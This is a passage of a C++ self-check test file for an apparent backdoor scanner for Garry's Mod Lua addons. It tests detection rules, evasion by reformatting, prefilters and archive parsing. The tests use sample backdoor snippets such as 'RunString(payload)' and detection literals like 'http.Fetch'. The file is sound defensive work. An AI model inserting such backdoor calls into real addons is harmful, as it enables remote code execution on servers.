            std::cerr << "FAIL " << test.expression << " should be "
                      << (test.refuse ? "refused" : "allowed") << std::endl;
            g_failures++;
        }
    }

    for (const std::string& id : patterns.Ids()) {
        const Pattern* pattern = patterns.ById(id);
        if (pattern != nullptr && RepeatsARepeat(pattern->expression)) {
            std::cerr << "FAIL shipped rule " << id << " would be refused: "
                      << pattern->expression << std::endl;
            g_failures++;
        }
    }

    std::cout << "selfcheck: " << (sizeof(cases) / sizeof(cases[0]))
              << " expression shapes checked for runaway backtracking, none of "
              << patterns.Ids().size() << " shipped rules affected" << std::endl;
}

static void TestBoundedMatchesFitTheOverlap(const PatternSet& patterns) {
    static const std::regex bound(R"(\{\s*\d+\s*,\s*(\d+)\s*\})");
    size_t widest = 0;
    std::string widestId;

    for (const std::string& id : patterns.Ids()) {
        const Pattern* pattern = patterns.ById(id);
        if (pattern == nullptr) continue;

        size_t reach = 0;
        for (auto it = std::sregex_iterator(pattern->expression.begin(),
                                            pattern->expression.end(), bound);
             it != std::sregex_iterator(); ++it) {
            reach += static_cast<size_t>(std::strtoul(it->str(1).c_str(), nullptr, 10));
        }
        if (reach > widest) { widest = reach; widestId = id; }
        if (reach > Scanner::kWindowOverlap) {
            std::cerr << "FAIL " << id << " can match " << reach
                      << " characters, more than the " << Scanner::kWindowOverlap
                      << "-byte overlap between scan windows, so it is found or missed "
                      << "depending on where the text sits in the file" << std::endl;
            g_failures++;
        }
    }

    std::cout << "selfcheck: widest bounded rule reaches " << widest << " characters ("
              << (widestId.empty() ? "none" : widestId) << "), overlap is "
              << Scanner::kWindowOverlap << std::endl;
}

static void TestAhoCorasick() {
    AhoCorasick automaton;
    const size_t run = automaton.Add("RunString");
    const size_t fetch = automaton.Add("http.Fetch");
    const size_t overlap = automaton.Add("String");
    CHECK(automaton.Add("RunString") == run);
    automaton.Build();
    CHECK(automaton.Built());
    CHECK(automaton.LiteralCount() == 3);

    std::vector<bool> present;
    const std::string haystack = "local x = RunString(payload)";
    automaton.Search(haystack.data(), haystack.size(), present);
    CHECK(present[run]);
    CHECK(present[overlap]);
    CHECK(!present[fetch]);

    const std::string clean = "print('hello world')";
    automaton.Search(clean.data(), clean.size(), present);
    CHECK(!present[run]);
    CHECK(!present[overlap]);

    automaton.Search("", 0, present);
    CHECK(present.size() == 3);
    CHECK(!present[run]);
}

static void TestPrefilterEquivalence(const fs::path& ruleDir, const PatternSet& patterns) {
    std::vector<std::string> inputs;
    for (const char* directory : { "malicious", "clean", "regression", "composite" }) {
        const fs::path dir = ruleDir / "tests" / "fixtures" / directory;
        std::error_code ec;
        if (!fs::is_directory(dir, ec) || ec) continue;
        for (const auto& entry : fs::directory_iterator(dir)) {
            if (!entry.is_regular_file()) continue;
            std::ifstream in(entry.path(), std::ios::binary);
            std::stringstream buffer;
            buffer << in.rdbuf();
            inputs.push_back(buffer.str());
        }
    }

    struct Suite {
        const char* file;
        const char* extension;
        const char* samplePath;
    };
    const Suite suites[] = {
        { "lua_patterns.test.txt", ".lua", "equivalence.lua" },
        { "binary_patterns.test.txt", ".vmt", "equivalence.vmt" },
        { "data_patterns.test.txt", ".txt", "data/equivalence.txt" },
        { "module_patterns.test.txt", ".dll", "lua/bin/gmsv_equivalence_win64.dll" },
    };

    std::vector<std::pair<std::string, const Suite*>> cases;
    for (const std::string& content : inputs) cases.push_back({ content, &suites[0] });
    for (const Suite& suite : suites) {
        std::vector<PatternTest> tests;
        if (!LoadPatternTests(ruleDir / suite.file, suite.extension, tests)) continue;
        for (const PatternTest& test : tests) cases.push_back({ test.snippet, &suite });
    }
    CHECK(cases.size() > 20);

    auto collect = [&](const std::string& content, const Suite& suite, bool prefilter) {
        Scanner scanner(patterns);
        scanner.SetPrefilterEnabled(prefilter);
        std::vector<std::string> keys;
        scanner.Scan(content, suite.samplePath, suite.extension, [&](const Detection& detection) {
            keys.push_back(detection.id + "@" + std::to_string(detection.lineNumber));
        });
        std::sort(keys.begin(), keys.end());
        return keys;
    };

    int mismatches = 0;
    size_t totalFindings = 0;
    for (const auto& entry : cases) {
        const std::vector<std::string> with = collect(entry.first, *entry.second, true);
        const std::vector<std::string> without = collect(entry.first, *entry.second, false);
        totalFindings += without.size();

        if (with != without) {
            mismatches++;
            if (mismatches <= 3) {
                std::cerr << "FAIL prefilter changed the result for " << entry.second->extension
                          << ": " << entry.first.substr(0, 80) << std::endl;
            }
        }
    }
    if (mismatches > 0) {
        std::cerr << "FAIL prefilter differed on " << mismatches << " of "
                  << cases.size() << " inputs" << std::endl;
        g_failures++;
    }
    CHECK(totalFindings > 50);
}

static void TestCorpusMetrics(const fs::path& ruleDir, const PatternSet& patterns) {
    CompositeRuleSet composites;
    composites.Load(ruleDir / "composite_rules.txt", patterns);

    struct Outcome { int files = 0; int flagged = 0; };
    Outcome malicious;
    Outcome benign;
    std::vector<std::string> missed;
    std::vector<std::string> falsePositives;

    for (const char* label : { "malicious", "benign" }) {
        const fs::path dir = ruleDir / "tests" / "corpus" / label;
        std::error_code ec;
        if (!fs::is_directory(dir, ec) || ec) {
            std::cerr << "FAIL: corpus directory missing: " << dir.string() << std::endl;
            g_failures++;
            continue;
        }

        const bool isMalicious = (std::string(label) == "malicious");
        Outcome& outcome = isMalicious ? malicious : benign;

        for (const auto& entry : fs::directory_iterator(dir)) {
            if (!entry.is_regular_file() || entry.path().extension() != ".lua") continue;

            std::ifstream in(entry.path(), std::ios::binary);
            std::stringstream buffer;
            buffer << in.rdbuf();

            std::map<std::string, int> found;
            std::string worst = "none";
            auto note = [&](const std::string& severity) {
                if (SeverityRank(severity) < SeverityRank(worst) || worst == "none") worst = severity;
            };

            Scanner scanner(patterns);
            scanner.Scan(buffer.str(), entry.path().filename().string(), ".lua",
                         [&](const Detection& detection) {
                             if (!detection.id.empty()) found[detection.id]++;
                             note(detection.severity);
                         });
            for (const CompositeRule* rule : composites.Match(found, false)) note(rule->severity);

            outcome.files++;
            const bool critical = (worst == "critical");
            const bool actionable = critical || (worst == "high");

            if (isMalicious) {
                if (actionable) outcome.flagged++;
                else missed.push_back(entry.path().filename().string());
            }
            else {
                if (critical) falsePositives.push_back(entry.path().filename().string());
                else outcome.flagged++;
            }
        }
    }

    CHECK(malicious.files >= 8);
    CHECK(benign.files >= 4);

    for (const std::string& name : missed) {
        std::cerr << "FAIL corpus: malicious/" << name
                  << " produced nothing at HIGH or above" << std::endl;
        g_failures++;
    }
    for (const std::string& name : falsePositives) {
        std::cerr << "FAIL corpus: benign/" << name << " produced a CRITICAL finding" << std::endl;
        g_failures++;
    }

    const double recall = malicious.files > 0
        ? (100.0 * malicious.flagged / malicious.files) : 0.0;
    std::cout << "selfcheck: corpus recall " << recall << "% ("
              << malicious.flagged << "/" << malicious.files << " malicious flagged), "
              << falsePositives.size() << " critical false positives over "
              << benign.files << " benign files" << std::endl;
}

static void TestRegressionFixtures(const fs::path& ruleDir, const PatternSet& patterns) {
    const fs::path dir = ruleDir / "tests" / "fixtures" / "regression";
    std::error_code ec;
    if (!fs::is_directory(dir, ec) || ec) {
        std::cerr << "FAIL: regression fixture directory missing: " << dir.string() << std::endl;
        g_failures++;
        return;
    }

    int files = 0;
    for (const auto& entry : fs::directory_iterator(dir)) {
        if (!entry.is_regular_file()) continue;
        files++;

        std::ifstream in(entry.path(), std::ios::binary);
        std::stringstream buffer;
        buffer << in.rdbuf();
        const std::string content = buffer.str();
        CHECK(!content.empty());

        std::vector<std::string> problems;
        int detections = 0;

        Scanner scanner(patterns);
        scanner.Scan(content, entry.path().filename().string(), ".lua",
                     [&](const Detection&) { detections++; },
                     [&](const std::string& id, const std::string& detail) {
                         problems.push_back(id + ": " + detail);
                     });

        for (const std::string& problem : problems) {
            std::cerr << "FAIL " << entry.path().filename().string()
                      << ": pattern did not finish: " << problem << std::endl;
            g_failures++;
        }

        const std::string withBackdoor = content + "\nRunString(payload)\n";
        int afterDetections = 0;
        scanner.Scan(withBackdoor, "appended.lua", ".lua",
                     [&](const Detection&) { afterDetections++; }, nullptr);
        CHECK(afterDetections > detections);
    }
    CHECK(files > 0);
}

static std::string MutateIndent(const std::string& snippet) {
    std::string result = "\t";
    for (char c : snippet) {
        result += c;
        if (c == '\n') result += "\t\t";
    }
    return result;
}

static std::string MutateTrailingComment(const std::string& snippet) {
    std::string result;
    for (char c : snippet) {
        if (c == '\n') result += " -- checked, see docs";
        result += c;
    }
    return result + " -- checked, see docs";
}

static std::string MutateParenSpacing(const std::string& snippet) {
    std::string result;
    for (char c : snippet) {
        if (c == '(') { result += "( "; continue; }
        if (c == ')') { result += " )"; continue; }
        result += c;
    }
    return result;
}

static std::string MutateWrapArguments(const std::string& snippet) {
    std::string result;
    bool inString = false;
    char quote = 0;
    for (char c : snippet) {
        if (inString) {
            result += c;
            if (c == quote) inString = false;
            continue;
        }
        if (c == '\'' || c == '"') { inString = true; quote = c; result += c; continue; }
        if (c == '(') { result += "(\n    "; continue; }
        if (c == ',') { result += ",\n    "; continue; }
        result += c;
    }
    return result;
}

static bool EndsAName(const std::string& text, size_t index) {
    if (index == 0) return false;
    const unsigned char previous = static_cast<unsigned char>(text[index - 1]);
    return std::isalnum(previous) != 0 || previous == '_';
}

static std::string InsertBeforeCall(const std::string& snippet, const std::string& filler) {
    std::string result;
    for (size_t i = 0; i < snippet.size(); ++i) {
        if (snippet[i] == '(' && EndsAName(snippet, i)) result += filler;
        result += snippet[i];
    }
    return result;
}

static std::string MutateSpaceBeforeCall(const std::string& snippet) {
    return InsertBeforeCall(snippet, " ");
}

static std::string MutateTabBeforeCall(const std::string& snippet) {
    return InsertBeforeCall(snippet, "\t");
}

static std::string MutateCommentBeforeCall(const std::string& snippet) {
    return InsertBeforeCall(snippet, "--[[c]]");
}

static std::string MutateStringCall(const std::string& snippet) {
    static const std::regex call(R"RX((\b[A-Za-z_][A-Za-z0-9_.:]*)\s*\(\s*("[^"\\\r\n]*")\s*\))RX");
    return std::regex_replace(snippet, call, "$1$2");
}

static std::string MutateLongStringCall(const std::string& snippet) {
    static const std::regex call(R"RX((\b[A-Za-z_][A-Za-z0-9_.:]*)\s*\(\s*"([^"\\\]\r\n]*)"\s*\))RX");
    return std::regex_replace(snippet, call, "$1[[$2]]");
}

static void TestRuleMutations(const fs::path& ruleDir, const PatternSet& patterns) {
    std::vector<PatternTest> tests;
    if (!LoadPatternTests(ruleDir / "lua_patterns.test.txt", ".lua", tests)) {
        std::cerr << "FAIL: mutation pass could not load lua_patterns.test.txt" << std::endl;
        g_failures++;
        return;
    }

    struct Mutation {
        const char* name;
        std::string (*apply)(const std::string&);
    };
    const Mutation mutations[] = {
        { "indented", MutateIndent },
        { "trailing comment", MutateTrailingComment },
        { "spaced parentheses", MutateParenSpacing },
        { "arguments wrapped across lines", MutateWrapArguments },
        { "a space before the call", MutateSpaceBeforeCall },
        { "a tab before the call", MutateTabBeforeCall },
        { "a comment before the call", MutateCommentBeforeCall },
        { "called without parentheses", MutateStringCall },
        { "called with a long string", MutateLongStringCall },
    };

    Scanner scanner(patterns);
    int applied = 0;

    for (const PatternTest& test : tests) {
        if (!test.expectMatch) continue;
        const Pattern* pattern = patterns.ById(test.id);
        if (pattern == nullptr || pattern->hasPathScope) continue;

        for (const Mutation& mutation : mutations) {
            const std::string mutated = mutation.apply(test.snippet);
            if (mutated == test.snippet) continue;

            bool fired = false;
            scanner.Scan(mutated, "test.lua", ".lua",
                         [&](const Detection& detection) {
                             if (detection.id == test.id) fired = true;
                         });
            applied++;

            if (!fired) {
                std::cerr << "FAIL lua_patterns.test.txt:" << test.lineNumber << ": " << test.id
                          << " stops matching once the snippet is " << mutation.name
                          << ", so the rule can be evaded by reformatting: " << mutated << std::endl;
                g_failures++;
            }
        }
    }

    std::cout << "selfcheck: " << applied << " reformatted variants of positive cases still detected"
              << std::endl;
}

static void RunShippedPatternTests(const fs::path& ruleDir) {
    PatternSet patterns;
    if (!patterns.LoadFromDirectory(ruleDir)) {
        std::cerr << "FAIL: shipped patterns could not be loaded from " << ruleDir.string() << std::endl;
        g_failures++;
        return;
    }

    for (const std::string& id : patterns.Ids()) {
        const Pattern* pattern = patterns.ById(id);
        CHECK(pattern != nullptr);
    }

    struct Suite {
        const char* file;
        const char* extension;
        const char* samplePath;
    };
    const Suite suites[] = {
        { "lua_patterns.test.txt", ".lua", "test.lua" },
        { "binary_patterns.test.txt", ".vmt", "test.vmt" },
        { "data_patterns.test.txt", ".txt", "data/test.txt" },
        { "module_patterns.test.txt", ".dll", "lua/bin/gmsv_test_win64.dll" },
    };

    std::set<std::string> positives;
    std::set<std::string> negatives;
    std::set<std::pair<std::string, std::string>> claimed;
    int executed = 0;
    int crossChecked = 0;

    for (const Suite& suite : suites) {
        std::vector<PatternTest> declared;
        if (LoadPatternTests(ruleDir / suite.file, suite.extension, declared)) {
            for (const PatternTest& test : declared) {
                if (test.expectMatch) {
                    claimed.insert({ test.snippet, test.id });
                }
            }
        }
    }

    for (const Suite& suite : suites) {
        std::vector<PatternTest> tests;
        const fs::path testPath = ruleDir / suite.file;
        if (!LoadPatternTests(testPath, suite.extension, tests)) {
            std::cerr << "FAIL: could not load " << testPath.string() << std::endl;
            g_failures++;
            continue;
        }

        Scanner scanner(patterns);
        for (const PatternTest& test : tests) {
            const Pattern* pattern = patterns.ById(test.id);
            if (pattern == nullptr) {
                std::cerr << "FAIL " << suite.file << ":" << test.lineNumber
                          << ": unknown pattern id " << test.id << std::endl;
                g_failures++;
                continue;
            }

            const std::string samplePath = pattern->hasPathScope
                ? SamplePathForGlob(pattern->pathGlob, suite.samplePath)
                : std::string(suite.samplePath);

            if (pattern->hasPathScope && !pattern->AppliesTo(samplePath)) {
                std::cerr << "FAIL " << suite.file << ":" << test.lineNumber << ": " << test.id
                          << " has a path scope no sample path can satisfy: "
                          << pattern->pathGlob << std::endl;
                g_failures++;
                continue;
            }

            std::set<std::string> fired;
            std::vector<Detection> hits;
            scanner.Scan(test.snippet, samplePath, suite.extension,
                         [&](const Detection& detection) {
                             fired.insert(detection.id);
                             hits.push_back(detection);
                         });

            if (!test.expectMatch) {
                for (const Detection& hit : hits) {
                    if (hit.severity != "critical") {
                        continue;
                    }
                    if (claimed.count({ test.snippet, hit.id }) > 0) {
                        continue;
                    }
                    std::cerr << "FAIL " << suite.file << ":" << test.lineNumber
                              << ": legitimate code written as a negative case for " << test.id
                              << " raised CRITICAL " << hit.id << ": " << test.snippet << std::endl;
                    g_failures++;
                }
                crossChecked++;
            }

            const bool matched = fired.count(test.id) > 0;
            if (matched != test.expectMatch) {
                std::cerr << "FAIL " << suite.file << ":" << test.lineNumber << ": " << test.id
                          << " expected " << (test.expectMatch ? "a match" : "no match")
                          << " for: " << test.snippet << std::endl;
                g_failures++;
            }

            (test.expectMatch ? positives : negatives).insert(test.id);
            executed++;
        }
    }

    for (const std::string& id : patterns.Ids()) {
        if (positives.count(id) == 0) {
            std::cerr << "FAIL: pattern " << id << " has no positive (+) test case" << std::endl;
            g_failures++;
        }
        if (negatives.count(id) == 0) {
            std::cerr << "FAIL: pattern " << id << " has no negative (-) test case" << std::endl;
            g_failures++;
        }
    }

    TestRuleMutations(ruleDir, patterns);
    TestRegressionFixtures(ruleDir, patterns);
    TestPrefilterEquivalence(ruleDir, patterns);
    TestBoundedMatchesFitTheOverlap(patterns);
    TestCatastrophicShapes(patterns);
    TestUtf8Sanitiser();
    TestCorpusMetrics(ruleDir, patterns);
    RunCompositeTests(ruleDir, patterns);

    std::cout << "selfcheck: " << executed << " pattern cases over "
              << patterns.Count() << " shipped patterns, " << crossChecked
              << " negatives cross-checked against every rule" << std::endl;
}

static void TestScanFailures() {
    SkipRegistry skipped;
    ExecuteScanTask("broken.lua", skipped, []() { throw std::runtime_error("read interrupted"); });
    CHECK(skipped.Total() == 1);
    CHECK(skipped.Count(SkipReason::ScanError) == 1);
    CHECK(skipped.Entries()[0].detail == "read interrupted");
    ExecuteScanTask("unknown.lua", skipped, []() { throw 7; });
    CHECK(skipped.Count(SkipReason::ScanError) == 2);
    const fs::path root = fs::temp_directory_path() / "bdscan_absent_directory_for_regression";
    CHECK(!fs::exists(root));
    const auto targets = CollectScanTargets(root, [](const fs::path&) { return true; }, skipped);
    CHECK(targets.empty());
    CHECK(skipped.Count(SkipReason::Unreadable) == 1);
}

static void TestArchiveMemory() {
    MemoryBudget budget(8);
    std::promise<void> holding;
    std::promise<void> release;
    auto released = release.get_future();
    auto first = std::async(std::launch::async, [&]() {
        MemoryBudget::Reservation reservation(budget, 6);
        holding.set_value();
        released.wait();
    });
    holding.get_future().wait();
    std::promise<void> attempting;
    auto second = std::async(std::launch::async, [&]() {
        attempting.set_value();
        MemoryBudget::Reservation reservation(budget, 4);
    });
    attempting.get_future().wait();
    CHECK(second.wait_for(std::chrono::milliseconds(30)) == std::future_status::timeout);
    release.set_value();
    first.get();
    CHECK(second.wait_for(std::chrono::seconds(2)) == std::future_status::ready);
    second.get();
    CHECK(budget.Peak() <= budget.Capacity());
    try {
        MemoryBudget::Reservation reservation(budget, 9);
        CHECK(false);
    }
    catch (const std::length_error&) {}
    try {
        MemoryBudget::Reservation reservation(budget, 8);
        throw std::runtime_error("interrupted archive");
    }
    catch (const std::runtime_error&) {}
    MemoryBudget::Reservation recovered(budget, 8);
    CHECK(budget.Peak() == 8);

    {
        MemoryBudget shared(8);
        MemoryBudget::Reservation growing(shared, 2);
        growing.Resize(8);
        CHECK(shared.Peak() == 8);
        growing.Resize(1);

        std::promise<void> taken;
        auto waiting = std::async(std::launch::async, [&]() {
            MemoryBudget::Reservation other(shared, 7);
            taken.set_value();
        });
        CHECK(taken.get_future().wait_for(std::chrono::seconds(2)) == std::future_status::ready);
        waiting.get();

        try {
            growing.Resize(9);
            CHECK(false);
        }
        catch (const std::length_error&) {}
    }

    {
        MemoryBudget shared(8);
        auto grow = [&]() {
            MemoryBudget::Reservation held(shared, 4);
            held.Resize(6);
        };
        auto left = std::async(std::launch::async, grow);
        auto right = std::async(std::launch::async, grow);
        CHECK(left.wait_for(std::chrono::seconds(5)) == std::future_status::ready);
        CHECK(right.wait_for(std::chrono::seconds(5)) == std::future_status::ready);
        left.get();
        right.get();
        CHECK(shared.Peak() <= shared.Capacity());
    }

    GMABuilder builder;
    builder.AddFile("lua/a.lua", "RunString(payload)");
    builder.AddFile("lua/empty.lua", "");
    const std::string content = builder.Finish();
    MemoryStream stream(content);
    const GMAInfo info = GMAReader::ReadGMAInfo(stream, static_cast<int64_t>(content.size()));
    CHECK(info.valid);
    CHECK(info.files.size() == 2);
    if (info.files.size() == 2) {
        CHECK(GMAReader::ExtractFileContent(stream, info.files[0], info.contentOffset, 1024) == "RunString(payload)");
    }
    stream.seekg(-1, std::ios::beg);
    CHECK(stream.fail());
    stream.clear();
    stream.seekg(0, std::ios::end);
    CHECK(stream.tellg() == static_cast<std::streamoff>(content.size()));
}

static void TestStrictRules(const fs::path& patternDir) {
    const fs::path invalid = patternDir / "invalid.txt";
    for (const char* rule : {
        "([;;;[LOW] LUA-990 Broken regex",
        "x;;;LUA-990 Missing severity",
        "x;;;[LOW] Missing identifier",
        "missing delimiter",
        "x;;;[LOW] LUA-990 One\ny;;;[HIGH] LUA-990 Duplicate"
    }) {
        { std::ofstream out(invalid); out << rule << '\n'; }
        PatternSet patterns;
        CHECK(!patterns.LoadGroup(invalid, { ".lua" }));
        CHECK(patterns.Count() == 0);
    }
    PatternSet valid;
    CHECK(valid.LoadFromDirectory(patternDir));
    { std::ofstream out(invalid); out << "LUA-900;;;[HIGH] COMP-900 Valid\nLUA-999;;;[HIGH] COMP-901 Unknown\n"; }
    CompositeRuleSet composites;
    CHECK(!composites.Load(invalid, valid));
    CHECK(composites.Count() == 0);
}

int main(int argc, char** argv) {
    TestScanFailures();
    TestArchiveMemory();
    TestSHA256();
    TestValidGMA();
    TestTruncatedGMA();
    TestHeaderOnlyGMA();
    TestAbsurdSizeGMA();
    TestOverlongContentGMA();
    TestBadMagicGMA();
    TestUnterminatedStringGMA();
    TestExtractionRejectsOversize();
    TestExtensionHelpers();
    TestStringHelpers();
    TestBase64Decoding();
    TestStripComments();
    TestFoldLiterals();
    TestIdParsing();
    TestGlobMatching();
    TestWhitelist();
    TestCompositeScope();
    TestArchiveEntryNames();
    TestSeverityHelpers();
    TestReportFilter();
    TestFileScores();
    TestSkipRegistry();
    TestCompositeExpressions();
    TestStructuralSignals();
    TestBinaryStrings();
    TestLiteralExtraction();
    TestPrefilterNecessity();
    TestAhoCorasick();
    TestLzma();
    TestCompressedGMA();

    const fs::path patternDir = WritePatternDirectory();
    TestStrictRules(patternDir);
    PatternSet patterns;
    if (!patterns.LoadFromDirectory(patternDir)) {
        std::cerr << "FAIL: pattern fixture could not be loaded" << std::endl;
        g_failures++;
    }
    else {
        TestPatternLoading(patterns);
        TestHintsAndContext(patterns);
        TestMultiLineDetection(patterns);
        TestObfuscationFolding(patterns);
        TestFoldingPreservesLineNumbers(patterns);
        TestLineNumbersAndDeduplication(patterns);
        TestExtensionRouting(patterns);
        TestCharCodeEnrichment(patterns);
        TestWindowBoundary(patterns);
    }
    fs::remove_all(patternDir);

    const fs::path ruleDir = FindRuleDirectory(argc, argv);
    if (ruleDir.empty()) {
        std::cerr << "FAIL: could not locate lua_patterns.txt "
                     "(pass the BD-Scan directory as the first argument)" << std::endl;
        g_failures++;
    }
    else {
        RunShippedPatternTests(ruleDir);
    }

    if (g_failures == 0) {
        std::cout << "selfcheck: all checks passed" << std::endl;
        return 0;
    }
    std::cerr << "selfcheck: " << g_failures << " check(s) failed" << std::endl;
    return 1;
}
